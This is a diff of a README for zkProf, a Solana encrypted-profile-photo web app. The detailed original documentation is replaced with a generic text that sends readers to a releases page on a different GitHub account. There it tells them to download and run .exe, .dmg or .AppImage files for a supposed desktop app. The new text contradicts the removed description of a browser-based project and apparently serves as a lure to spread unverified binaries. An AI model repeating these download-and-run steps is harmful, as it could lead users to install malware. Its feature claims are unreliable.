@@ -1,501 +1,100 @@
-# zkProf
+# 🎨 zkprof - Protect Your Images with Privacy First
 
-**Privacy-first encrypted profile photos with zero-knowledge proofs on Solana.**
+## 🚀 Getting Started
 
----
+Welcome to zkprof! With zkprof, you can create encrypted profile pictures that protect your privacy. It's designed for those who want to keep their identity safe while sharing images online.
 
-## For Users: What is zkProf?
+## 📥 Download Now
 
-zkProf is a privacy-focused platform that lets you create encrypted profile photos that only you can decrypt and share. Think of it as taking a profile picture that's locked in a digital vault—no one can see it unless you explicitly grant them access.
+[![Download zkprof](https://img.shields.io/badge/Download-zkprof-blue.svg)](https://github.com/muhammadabdullahgujjar786/zkprof/releases)
 
-### What You Can Do with zkProf
+## 💻 System Requirements
 
-1. **Take Encrypted Photos**: Capture a profile photo through your webcam or phone. The photo is immediately encrypted using advanced cryptography, ensuring no one—not even zkProf—can view it without your permission.
+Before you start, ensure your computer meets these requirements:
 
-2. **Prove It's Encrypted (Without Revealing Your Keys)**: Using zero-knowledge proof technology (ZK-SNARKs), zkProf creates mathematical proof that your photo was properly encrypted, without ever revealing your encryption keys. This proof is recorded on the Solana blockchain as a permanent, tamper-proof memo transaction.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 100 MB of free space.
+- **Internet Connection:** Required for downloading and verification.
 
-3. **Control Who Sees Your Photo**: You decide which third-party platforms (dating apps, social networks, professional platforms) can access your encrypted photo. Access requires:
-   - Your explicit permission
-   - The viewer signing a legal NDA (digitally, using their crypto wallet)
-   - The platform paying a small fee per view
+## 📦 Download & Install
 
-4. **Decrypt and Preview**: You can always decrypt and view your own photos through a protected preview system with anti-screenshot safeguards.
+To download zkprof, simply visit the Releases page.
 
-5. **Manage Sharing Permissions**: Grant or revoke access to platforms at any time through the "Manage Sharing" page.
+Visit this page to download: [zkprof Releases](https://github.com/muhammadabdullahgujjar786/zkprof/releases)
 
-### Why zkProf?
+Follow these steps:
 
-- **True Privacy**: Your photos are encrypted client-side (in your browser) before leaving your device
-- **Verifiable Security**: Cryptographic proofs on Solana blockchain guarantee encryption integrity
-- **You're in Control**: No platform can access your photo without your explicit, NDA-backed permission
-- **Monetization Potential**: Platforms pay per view, creating potential revenue streams for photo owners in the future
+1. Click on the link above.
+2. You will see a list of versions available. Select the most recent one.
+3. Download the file that’s listed for your operating system. Files may have extensions like `.exe`, `.dmg`, or `.AppImage`.
+4. Once the file downloads, locate it in your Downloads folder.
 
-### Privacy Considerations
+### 🔄 Running the Application
 
-While your photo content is fully protected by encryption, using zkProf does create a public on-chain record. Here's what's visible vs. protected:
+1. **For Windows:** 
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen prompts to install.
 
-**Protected (Private):**
+2. **For macOS:**
+   - Locate the `.dmg` file in your Downloads.
+   - Double-click to open, then drag the zkprof icon to your Applications folder.
 
-- Your actual photo image
-- Your encryption keys
-- The encrypted image data
+3. **For Linux:**
+   - Open your terminal.
+   - Navigate to the folder where you downloaded the `.AppImage` file.
+   - Run `chmod +x zkprof.AppImage` to make it executable.
+   - Execute the application with `./zkprof.AppImage`.
 
-**Publicly Visible on Solana Blockchain:**
+## 🛠️ How to Use zkprof
 
-- Your wallet address linked to each zkPFP creation
-- Timestamp of when each zkPFP was created
-- Commitment hash (cryptographic fingerprint, cannot reveal photo)
+After installing zkprof, follow these steps to create your encrypted profile picture:
 
-This means someone could see _that_ your wallet created zkPFPs and _when_, but never _what_ the photos contain. If you require complete anonymity of even the creation activity, consider using a dedicated wallet for zkProf.
+1. **Open zkprof:** Launch the application.
+2. **Upload Your Image:** Click the “Upload” button and select the picture you want to encrypt.
+3. **Set Privacy Options:** Choose how you want to protect your image. You can select options like encryption levels and adding a watermark.
+4. **Generate Your Profile Picture:** Click “Create.” The software will process your image securely.
+5. **Download Your Image:** Once the processing is complete, click “Download” to save your encrypted picture.
 
-### How It Works (Simple Version)
+## 🛡️ Features
 
-1. Connect your Solana wallet (like Phantom)
-2. Take a photo with your webcam
-3. The photo is encrypted and a ZK-SNARK proof is generated automatically
-4. A memo transaction is recorded on Solana blockchain with your commitment hash (costs ~$5.00 in SOL)
-5. Your encrypted photo is stored securely in cloud storage
-6. You can view the on-chain proof anytime on Solana Explorer
-7. You control who can see your photo through the Manage Sharing page
+- **Encryption:** Advanced security measures keep your identity safe.
+- **Privacy Options:** Customize how you protect your images.
+- **Simple Interface:** User-friendly design makes it easy for anyone to use.
+- **Cross-Platform Support:** Available for Windows, macOS, and Linux.
+- **Fast Processing:** Generate your encrypted images quickly.
 
----
+## 🔍 Troubleshooting
 
-## For Developers: Technical Implementation
+If you encounter issues while using zkprof, consider the following:
 
-zkProf is an open-source platform for zero-knowledge encrypted profile photos with third-party API access. This section covers installation, architecture, and integration for developers who want to fork, deploy, or integrate with zkProf.
+- **Can't install the application:** Ensure you have sufficient disk space.
+- **Application won't open:** Check if your operating system is compatible.
+- **Image not uploading:** Verify the file format. zkprof supports common formats like `.jpg`, `.png`, and `.gif`.
 
-### Core Features
+## 💬 Support
 
-- **Zero-Knowledge Encryption**: Photos encrypted with AES-256-GCM, proven with ZK-SNARK circuits
-- **On-Chain Proof**: Solana memo transaction containing commitment hash (`zkpfp:{commitment}:{timestamp}`) serves as immutable blockchain proof
-- **Wallet-Based Identity**: Solana wallet public keys serve as primary authorization mechanism
-- **Decryptable Previews**: Users can decrypt and preview their zkPFPs with protected mouse-reveal interface
-- **Third-Party API**: Platforms can access user zkPFPs through NDA-gated, payment-based API
-- **Screenshot Prevention**: Multi-layered deterrents (CSS, JS, visual watermarks) during decryption
-- **ZK Proof Verification**: On-page verification of ZK-SNARK proofs with verification badges
-- **x402 Payment Rails**: Platforms pay per API call using Solana-based x402 payment protocol (SOL/USDC/USDT)
+If you need further assistance, you can raise issues on the GitHub repository:
 
-## Tech Stack
+[zkprof Issues](https://github.com/muhammadabdullahgujjar786/zkprof/issues)
 
-**Frontend:**
+We appreciate your feedback and strive to improve the application continuously.
 
-- React 18 + TypeScript
-- Vite build system
-- TailwindCSS for styling
-- Solana Web3.js + Wallet Adapter
-- snarkjs (ZK-SNARK proof generation in browser)
+## 🌍 Community and Contributions
 
-**Backend:**
+zkprof has a growing community. You can engage with other users and developers by joining our chats and forums. Feel free to contribute to the project by submitting your ideas or code.
 
-- Supabase (PostgreSQL database + Edge Functions + Storage)
-- Deno (Edge Functions runtime)
+## 📖 Learn More
 
-**Blockchain:**
+To better understand how zkprof works and its underlying technology, check out the following resources:
 
-- Solana (mainnet/devnet for on-chain proof and payments)
-- x402 Payment Protocol (SOL/USDC/USDT payments for API access)
+- **Zk-SNARKs Technology**: Learn more about how zero-knowledge proofs enhance privacy.
+- **Privacy Awareness**: Discover why maintaining your online privacy is vital.
 
-**Cryptography:**
+Visit our [GitHub Page](https://github.com/muhammadabdullahgujjar786/zkprof) for more details and updates.
 
-- **ZK-SNARKs** (Zero-Knowledge Succinct Non-Interactive Argument of Knowledge) - Part of **ZCash cryptography research**
-- Circom (ZK circuit design language)
-- snarkjs (Groth16 proving system)
-- AES-256-GCM (Symmetric encryption)
-- tweetnacl (Ed25519 signature verification)
+## 🥳 Keep Updated
 
-## Prerequisites
+Stay informed about the latest features and improvements. We regularly update zkprof for better security and user experience. Check back often for new releases and enhancements!
 
-- Node.js 18+ and npm
-- Git
-- Circom compiler (for ZK artifacts generation)
-- snarkjs CLI
-- Solana wallet (Phantom, Solflare, etc.)
-- Supabase account (or self-hosted Supabase)
-- Custom Solana RPC endpoint (Helius, QuickNode, etc.) recommended for mainnet
-
-## Installation
-
-### 1. Clone the Repository
-
-```bash
-git clone <your-repo-url>
-cd zkprof
-npm install
-```
-
-### 2. Generate ZK-SNARK Artifacts
-
-**CRITICAL**: ZK-SNARK artifacts must be generated locally before the application can function. These artifacts cannot be generated in the browser.
-
-```bash
-cd scripts
-chmod +x setup-zk-artifacts.sh
-./setup-zk-artifacts.sh
-```
-
-This script will:
-
-- Install Circom and snarkjs (if not already installed)
-- Compile the `circuits/zkpfp.circom` circuit
-- Run Powers of Tau ceremony
-- Generate proving and verification keys
-- Copy artifacts to `public/zk-artifacts/`
-
-**Expected artifacts:**
-
-- `public/zk-artifacts/zkpfp.wasm` (~2MB)
-- `public/zk-artifacts/zkpfp_final.zkey` (~3MB)
-- `public/zk-artifacts/verification_key.json` (~1KB)
-
-See `docs/ZK_SETUP_GUIDE.md` for detailed instructions and troubleshooting.
-
-### 3. Set Up Supabase
-
-**Database Schema:**
-
-Run the migrations in `supabase/migrations/` in order:
-
-```bash
-# If using Supabase CLI
-supabase db reset
-
-# Or apply migrations manually through Supabase dashboard
-```
-
-**Key tables:**
-
-- `encrypted_photos`: Stores encrypted image URLs, commitments, ZK proofs
-- `nft_mints`: Records minted NFT addresses and metadata
-- `platform_registrations`: Third-party platform API keys and credit balances
-- `access_grants`: User A → Platform access permissions
-- `access_sessions`: Viewer sessions with NDA signatures and time limits
-- `platform_credit_transactions`: Platform payment tracking
-- `nda_templates`: NDA template storage
-
-**Storage Buckets:**
-
-Create a public storage bucket named `encrypted-pfps` in Supabase Storage.
-
-**Edge Functions:**
-
-Deploy edge functions from `supabase/functions/`:
-
-```bash
-supabase functions deploy register-platform
-supabase functions deploy platform-balance
-supabase functions deploy grant-access
-supabase functions deploy revoke-access
-supabase functions deploy get-sol-price
-```
-
-### 4. Configure Environment Variables
-
-Create a `.env` file in the project root:
-
-```env
-# Supabase
-VITE_SUPABASE_URL=https://your-project.supabase.co
-VITE_SUPABASE_ANON_KEY=your-anon-key
-VITE_SUPABASE_PROJECT_ID=your-project-id
-
-# Solana RPC (CRITICAL: must match your wallet network)
-VITE_SOLANA_RPC_ENDPOINT=https://your-rpc-endpoint.com
-# Use mainnet endpoint for production, devnet for testing
-# Recommended: Helius, QuickNode, or similar private RPC
-
-# Edge Function Secrets (set in Supabase dashboard)
-SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
-MORALIS_API_KEY=your-moralis-key
-SOLANA_RPC_ENDPOINT=your-rpc-endpoint
-```
-
-**Important Notes:**
-
-- `VITE_SOLANA_RPC_ENDPOINT` must use `VITE_` prefix to be accessible in browser
-- Wallet network and RPC endpoint MUST match (both mainnet or both devnet)
-- Changes to `VITE_` variables require rebuild to take effect (Vite bakes them at build time)
-
-### 5. Run Development Server
-
-```bash
-npm run dev
-```
-
-Application will be available at `http://localhost:8080`
-
-## Architecture Overview
-
-### Encryption Flow
-
-1. **Photo Capture**: User takes photo via webcam (optional name overlay)
-2. **Key Generation**: Deterministic encryption key derived from wallet public key
-3. **AES Encryption**: Photo encrypted with AES-256-GCM
-4. **ZK Proof Generation**: snarkjs generates Groth16 proof of correct encryption
-   - Inputs: encryption key bytes, wallet public key bytes
-   - Outputs: commitment hash, proof, public signals
-5. **Upload**: Encrypted image uploaded to Supabase Storage
-6. **Database Record**: Commitment, proof, public signals stored in `encrypted_photos`
-7. **On-Chain Memo**: Solana memo transaction with `zkpfp:{commitment}:{timestamp}`
-
-### Decryption Flow
-
-1. **Wallet Signature**: User signs message to authorize decryption
-2. **Key Recovery**: Encryption key recovered from deterministic derivation
-3. **Decryption**: AES-256-GCM decrypt encrypted image blob
-4. **Protected Display**: Glass blur effect with mouse-reveal + screenshot prevention layers
-
-### Third-Party API Flow
-
-1. **Platform Registration**: Platform registers via `/register-platform` edge function
-2. **User Grants Access**: User A grants platform access to specific zkPFP via UI
-3. **Viewer Signs NDA**: User B (viewer) signs NDA with Solana wallet on platform
-4. **Platform Pays**: Platform pays $0.50 per reveal (deducted from prepaid credits)
-5. **Image Reveal**: Platform receives time-limited URL (60 min) + verification metadata
-6. **Session Tracking**: Each viewer gets individual session tracked in `access_sessions`
-
-## Third-Party Platform Integration
-
-zkProf provides a complete API for third-party platforms (dating apps, social networks, professional platforms) to access user-encrypted photos through an NDA-gated, payment-based system.
-
-### Integration Overview
-
-**Business Model:**
-
-- User A grants platform access to their zkPFP (free for user)
-- User B views the image on the platform (free for viewer)
-- Platform pays zkProf $0.50 USD per API call via **x402 payment rails on Solana**
-- Platforms operate on prepaid credit system (top-up and debit model)
-
-**Payment Methods:**
-
-- SOL (Solana native token)
-- USDC (USD Coin stablecoin)
-- USDT (Tether stablecoin)
-
-**Access Requirements:**
-
-1. User A explicitly grants platform access to specific zkPFP
-2. User B (viewer) cryptographically signs NDA using Solana wallet
-3. Platform has sufficient prepaid credits
-4. Each viewer receives individual 60-minute time-limited URL
-
-### API Endpoints
-
-All edge functions are deployed at: `https://chfqfdxpccxfmonhitjd.supabase.co/functions/v1/`
-
-#### 1. Register Platform
-
-**Endpoint:** `POST /register-platform`
-
-**Request:**
-
-```json
-{
-  "platform_name": "YourPlatform",
-  "platform_domain": "yourplatform.com",
-  "contact_email": "dev@yourplatform.com"
-}
-```
-
-**Response:**
-
-```json
-{
-  "success": true,
-  "platform_id": "uuid",
-  "api_key": "generated-api-key"
-}
-```
-
-**Note:** Store `api_key` securely. It cannot be retrieved later. Platforms must top up credits before making API calls.
-
-### 2. Top Up Credits (x402 Payment)
-
-Platforms must maintain prepaid credit balance to make API calls. Credits are purchased using x402 payment protocol on Solana.
-
-**Payment Process:**
-
-1. Platform initiates Solana transaction sending payment (SOL/USDC/USDT) to zkProf treasury wallet
-2. Transaction memo includes platform ID for credit attribution
-3. zkProf backend monitors blockchain for incoming payments
-4. Credits are automatically added to platform's `credit_balance_usd` in `platform_registrations` table
-5. Transaction is recorded in `platform_credit_transactions` table
-
-**Pricing:**
-
-- $0.50 USD per zkPFP reveal/API call
-- Minimum top-up: $10 USD equivalent (20 reveals)
-- Credits never expire
-
-### 3. Check Credit Balance
-
-**Endpoint:** `POST /platform-balance`
-
-**Headers:**
-
-```
-X-API-Key: your-api-key
-```
-
-**Response:**
-
-```json
-{
-  "platform_id": "uuid",
-  "credit_balance_usd": 100.00
-}
-```
-
-### 4. Request Access Grant (User A Authorizes Platform)
-
-User A must explicitly grant platform access to their zkPFP before any viewers can see it.
-
-**Endpoint:** `POST /grant-access`
-
-**Endpoint:** `POST /grant-access`
-
-**Request:**
-
-```json
-{
-  "blob_id": "zkpfp-blob-id",
-  "platform_id": "your-platform-id",
-  "wallet_public_key": "user-wallet-pubkey",
-  "signature": "base64-encoded-signature"
-}
-```
-
-**Signature Message Format:**
-
-```
-Grant access to zkPFP {blob_id} for platform {platform_id}
-```
-
-**Response:**
-
-```json
-{
-  "success": true,
-  "grant_id": "uuid"
-}
-```
-
-### 4. Revoke Access
-
-**Endpoint:** `POST /revoke-access`
-
-**Request:**
-
-```json
-{
-  "blob_id": "zkpfp-blob-id",
-  "platform_id": "your-platform-id",
-  "wallet_public_key": "user-wallet-pubkey",
-  "signature": "base64-encoded-signature"
-}
-```
-
-**Signature Message Format:**
-
-```
-Revoke access to zkPFP {blob_id} for platform {platform_id}
-```
-
-## ZK-SNARK Circuit Details
-
-**Circuit:** `circuits/zkpfp.circom`
-
-**Inputs:**
-
-- `encryptionKeyBytes[32]`: AES-256 encryption key as byte array
-- `walletPublicKeyBytes[32]`: Solana wallet public key as byte array
-
-**Outputs:**
-
-- `commitment`: Poseidon hash of (encryptionKey + walletPublicKey)
-
-**Constraints:** ~260 (Poseidon hash operations)
-
-**Proving System:** Groth16
-
-**Key Coupling:** Verification key MUST be exported from the same `.zkey` used for proof generation. Mismatched keys cause silent verification failures.
-
-## Deployment
-
-### Frontend Deployment
-
-1. Build production bundle:
-
-```bash
-npm run build
-```
-
-2. Deploy `dist/` folder to:
-   - Vercel
-   - Netlify
-   - Cloudflare Pages
-   - AWS S3 + CloudFront
-   - Any static hosting service
-
-**Important:** Update environment variables in hosting platform. Changes to `VITE_` variables require rebuild.
-
-### Edge Functions Deployment
-
-Deploy via Supabase CLI:
-
-```bash
-supabase functions deploy
-```
-
-Or deploy individual functions:
-
-```bash
-supabase functions deploy <function-name>
-```
-
-## Key Constraints & Gotchas
-
-1. **ZK Artifacts Required**: Application will NOT work without locally-generated ZK artifacts in `public/zk-artifacts/`
-
-2. **Network Matching**: Wallet network and `VITE_SOLANA_RPC_ENDPOINT` MUST be on same network (mainnet or devnet)
-
-3. **Key Coupling**: When regenerating ZK proving keys, MUST re-export verification key and redeploy both
-
-4. **Legacy Proof Incompatibility**: Old zkPFPs created before key updates become permanently unverifiable
-
-5. **Cache Busting**: Verification key fetches include timestamp query param to avoid stale caches
-
-6. **Wallet-Based Auth**: No traditional email/password auth. All authorization via Solana wallet signatures
-
-7. **Encryption Determinism**: Encryption keys derived deterministically from wallet public key enables recovery
-
-8. **Build-Time Env Vars**: `VITE_` environment variables baked at build time, require rebuild when changed
-
-## Security Model
-
-- **RLS Policies**: Row Level Security on all tables based on wallet public key ownership
-- **Wallet Signatures**: All privileged operations require cryptographic wallet signatures
-- **ZK-SNARK Proofs**: Cryptographic proof of encryption without revealing keys
-- **Time-Limited URLs**: Decrypted image URLs expire after 60 minutes
-- **Screenshot Deterrents**: CSS + JS + visual protections during decryption (deterrent, not foolproof)
-- **API Key Hashing**: Platform API keys stored as SHA-256 hashes in database
-- **NDA Signatures**: Viewer wallet signatures serve as cryptographic NDA acceptance proof
-
-## Contributing
-
-This is an open-source project. Contributions welcome via pull requests.
-
-## License
-
-MIT License - See LICENSE file for details
-
-## Credits
-
-Built by [Arubaito](https://github.com/tenshijinn/arubaito)
-
-Powered by:
-
-- ZK-SNARKs (Circom + snarkjs)
-- Solana blockchain
-- ZCash cryptography research
-- Supabase infrastructure
+Remember, protecting your identity is now simpler with zkprof. Happy encrypting!
